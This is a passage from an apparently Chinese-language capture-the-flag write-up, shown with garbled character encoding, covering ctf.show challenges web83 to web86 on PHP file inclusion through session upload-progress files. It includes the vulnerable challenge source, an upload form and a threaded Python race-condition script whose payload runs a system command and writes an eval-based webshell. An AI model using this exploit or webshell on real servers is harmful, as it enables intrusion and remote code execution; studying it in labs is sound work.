href="https://www.cnblogs.com/NPFS/p/13795170.html" target="_blank" rel="noopener">åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSè¿›è¡Œæ–‡ä»¶åŒ…å« - NPFS - åšå®¢å›­ (cnblogs.com)</a></p></li></ul><h3 id="é˜»ç¢æ¡ä»¶ä¸€"><a href="#é˜»ç¢æ¡ä»¶ä¸€" class="headerlink" title="é˜»ç¢æ¡ä»¶ä¸€"></a>é˜»ç¢æ¡ä»¶ä¸€</h3><p>session.auto_start=On(ä¹Ÿå°±æ˜¯ç­‰äºåˆ©ç”¨session_start();æ¥åˆå§‹åŒ–ä¸€ä¸ªä¼šè¯)ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚</p><h3 id="æœ‰åˆ©æ¡ä»¶ä¸€"><a href="#æœ‰åˆ©æ¡ä»¶ä¸€" class="headerlink" title="æœ‰åˆ©æ¡ä»¶ä¸€"></a>æœ‰åˆ©æ¡ä»¶ä¸€</h3><p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹session.use_strict_modeçš„å€¼ä¸ºoff(é»˜è®¤å€¼)ï¼Œå¦‚æœå¼€å¯ä»–ä¼šé™åˆ¶ç”¨æˆ·çš„sessidï¼Œä½¿å…¶éç”¨æˆ·å¯æ§ï¼Œè¿™æ ·åšçš„ç›®çš„å°±æ˜¯åœ¨cookieä¸­è®¾ç½®phpsessidçš„æ—¶å€™ä¿è¯æˆ‘ä»¬çš„å€¼å¯æ§æ¥å®ç°è¾¾åˆ°æ”»å‡»çš„æ•ˆæœï¼Œè¿™æ ·æˆ‘ä»¬å¦‚æœä¼ å…¥COOKIE:PHPSESSID=flagï¼ŒåŠ ä¸Šæˆ‘ä»¬ä¼ å…¥çš„postæ•°æ®ï¼Œå°±ä¼šç”Ÿæˆ/tmp/sess_flagæ–‡ä»¶ï¼Œ<strong>å³ä½¿ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–ä¸€ä¸ªä¼šè¯ï¼Œphpä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–ä¸€ä¸ªsession</strong>ï¼Œå¹¶ä¸”åŒæ—¶ä¼šäº§ç”Ÿä¸€ä¸ªå¥å€¼ï¼Œè¿™ä¸ªå¥å€¼æœ‰ini.get(â€œsession.upload_progress.prefixâ€)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_nameæ–‡ä»¶é‡Œã€‚</p><h3 id="é˜»ç¢æ¡ä»¶äºŒ"><a href="#é˜»ç¢æ¡ä»¶äºŒ" class="headerlink" title="é˜»ç¢æ¡ä»¶äºŒ"></a>é˜»ç¢æ¡ä»¶äºŒ</h3><p>é»˜è®¤é…ç½®<code>session.upload_progress.cleanup = on</code>å¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºï¼Œ<strong>ä¸€æ—¦è¯»å–äº†æ‰€æœ‰POSTæ•°æ®ï¼Œå®ƒå°±ä¼šæ¸…é™¤è¿›åº¦ä¿¡æ¯</strong></p><p>è§£å†³æ–¹æ¡ˆï¼šåˆ©ç”¨æ¡ä»¶ç«äº‰æ¥å®ç°</p><p>é¦–å…ˆæ„é€ postæ•°æ®åŒ…ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://988f4820-c15d-47e3-ae23-353645cab577.challenge.ctf.show:8080/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B407%E6%9C%8803%E6%97%A51747_1.png" alt></p><p>çº¿ç¨‹å¼€çš„å¤§ä¸€ç‚¹åŸºæœ¬åœ¨20å·¦å³ç„¶åå°±ä¼šçˆ†å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B407%E6%9C%8803%E6%97%A51759_2.png" alt></p><p>ç†ä¸€ä¸‹æ€è·¯ï¼š</p><p><a href="https://www.cnblogs.com/cqingt/p/6676248.html" target="_blank" rel="noopener">PHPåˆ©ç”¨Sessionå®ç°ä¸Šä¼ è¿›åº¦</a></p><p>å› ä¸ºå½“session.upload_progress.enabledåœ¨inié€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€</p><p> è€Œåœ¨iniæ–‡ä»¶å½“ä¸­æ˜¯è¿™ä¸ªæ ·å­çš„</p><pre class="line-numbers language-php"><code class="language-php">session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>enabled <span class="token operator">=</span> <span class="token string">"1"</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>cleanup <span class="token operator">=</span> <span class="token string">"1"</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>prefix <span class="token operator">=</span> <span class="token string">"upload_progress_"</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>freq <span class="token operator">=</span> <span class="token string">"1%"</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>min_freq <span class="token operator">=</span> <span class="token string">"1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆåˆ©ç”¨postä¼ åŒ…ï¼Œå¹¶ä¸”åˆ©ç”¨php_session.upload_progressæ¥åšåˆ°å°†è‡ªå·±å®šä¹‰çš„åå­—ä¸ºphpsessidä¸­çš„å€¼çš„æ–‡ä»¶æˆåŠŸä¼ å…¥æ”»å‡»å¯¹è±¡æœåŠ¡å™¨ä¸­ï¼Œåˆå› ä¸ºcleanæ–¹æ³•çš„å­˜åœ¨ï¼Œæ‰€ä»¥éœ€è¦ä¸€è¾¹åŒ…å«æ­¤æ–‡ä»¶ï¼Œä¸€è¾¹ä¼ å…¥æ­¤æ–‡ä»¶æ¥è§¦å‘æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ</p><p><strong>sessionæ–‡ä»¶é»˜è®¤å­˜å‚¨è·¯å¾„</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¯”ä¸Šä¸€é“é¢˜å¤šäº†ä¸¤ä¸ªå‡½æ•°ï¼š</p><p><strong>session_unset()</strong> ä¼šé‡Šæ”¾å½“å‰ä¼šè¯æ³¨å†Œçš„æ‰€æœ‰ä¼šè¯å˜é‡ã€‚ </p><p><strong>session_destroy()</strong> é”€æ¯å½“å‰ä¼šè¯ä¸­çš„å…¨éƒ¨æ•°æ®ï¼Œ   ä½†æ˜¯ä¸ä¼šé‡ç½®å½“å‰ä¼šè¯æ‰€å…³è”çš„å…¨å±€å˜é‡ï¼Œ   ä¹Ÿä¸ä¼šé‡ç½®ä¼šè¯ cookieã€‚   å¦‚æœéœ€è¦å†æ¬¡ä½¿ç”¨ä¼šè¯å˜é‡ï¼Œ   å¿…é¡»é‡æ–°è°ƒç”¨ <strong>session_start()</strong>å‡½æ•°ã€‚   </p><p>   ä¸ºäº†å½»åº•é”€æ¯ä¼šè¯ï¼Œæ¯”å¦‚åœ¨ç”¨æˆ·é€€å‡ºç™»å½•çš„æ—¶å€™ï¼Œå¿…é¡»åŒæ—¶é‡ç½®ä¼šè¯ IDã€‚   å¦‚æœæ˜¯é€šè¿‡ cookie æ–¹å¼ä¼ é€ä¼šè¯ ID çš„ï¼Œé‚£ä¹ˆåŒæ—¶ä¹Ÿéœ€è¦   è°ƒç”¨ <strong>setcookie()</strong> å‡½æ•°æ¥   åˆ é™¤å®¢æˆ·ç«¯çš„ä¼šè¯ cookieã€‚ </p><p><strong>Hintsï¼š</strong>è¿™é‡Œéœ€è¦å¤šæ·»åŠ session_start()æ¥å»ºç«‹ä¼šè¯</p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><!DOCTYPE html><html><body><form action="http://e0095d68-5aa1-477e-9294-4ee1c0d46581.challenge.ctf.show:8080/" method="POST" enctype="multipart/form-data">    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />    <input type="file" name="file" />    <input type="submit" value="submit" /></form></body></html><?phpsession_start();?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤§ä½¬è„šæœ¬(å¯ä»¥ä¸€æŠŠæ¢­åˆ°web86ï¼Œæ²¡æœ‰æµ‹è¯•è¿‡åªæ˜¯å¸–ä¸€ä¸‹ä¸çŸ¥é“å¥½ç”¨ä¸å¥½ç”¨)ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'Qftm'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            <span class="token string">'http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/'</span><span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>f<span class="token string">'http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_{sessid}'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token operator">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¾ç„¶å¾—åˆ°fl0g.php</p><p>ç„¶ååŒæ ·åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥è¯»å–å³å¯çº¿ç¨‹20å·¦å³å¾ˆå¿«å°±è¯»å–åˆ°äº†</p><h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><p>çœ‹äº†ä¸€ä¸‹å‰©ä¸‹ä¸€ç›´åˆ°web86çš„Hintï¼Œå‘ç°ä¸€æ‘¸ä¸€æ ·æ‰€ä»¥å°±åªå¸–ä¸€ä¸‹æºç ï¼Œä¸æ‰“ç®—é‡å¤æ“ä½œäº†å…¶å®æ—¢ç„¶æ˜ç™½äº†session.upload_processå¯¹æ–‡ä»¶ä¸Šä¼ çš„å¤„ç†è¿‡ç¨‹ï¼Œè¿™ç§é¢˜ç›®å°±å·²ç»æ²¡æœ‰äº†å¤šå¤§æ„ä¹‰äº†</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm -rf /tmp/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œé¢å¤šäº†ä¸€ä¸ªåˆ é™¤çš„å‘½ä»¤ï¼Œä½†æ˜¯å› ä¸ºsession.upload_progress.cleanup = â€œ1â€çš„ä½œç”¨é‡å¤äº†ï¼Œæ‰€ä»¥åªè¦è®¿é—®å¤Ÿå¿«ï¼Œå°±ä¸€å®šå¯ä»¥è®¿é—®åˆ°ï¼Œæ‰€ä»¥æ²¡å»å°è¯•ï¼ŒåŸç†ä¸€æ ·</p><h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒç†ï¼Œå°†ä½ è®¿é—®çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­æ˜¯å¦æœ‰&lt;è¿™ä¸ªç¬¦å·ï¼Œæœ‰å°±ç›´æ¥æŒ‚ï¼Œæ„Ÿè§‰ç«äº‰ä¸Šçš„è¯åº”è¯¥ä¹Ÿå¯ä»¥</p><h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'è¿˜è¦ç§€ï¼Ÿ'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_include_path</span><span class="token punctuation">(</span>è¿˜è¦ç§€ï¼Ÿ<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®šä¹‰ä¸€ä¸ªå¸¸é‡ï¼Œå€¼ä¸ºå½“å‰ç›®å½•çš„è·¯å¾„ï¼Œç»è¿‡æµ‹è¯•ï¼š/var/www/htmlç«äº‰ä¾ç„¶å¯ä»¥è¡Œå¾—é€š</p><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><pre 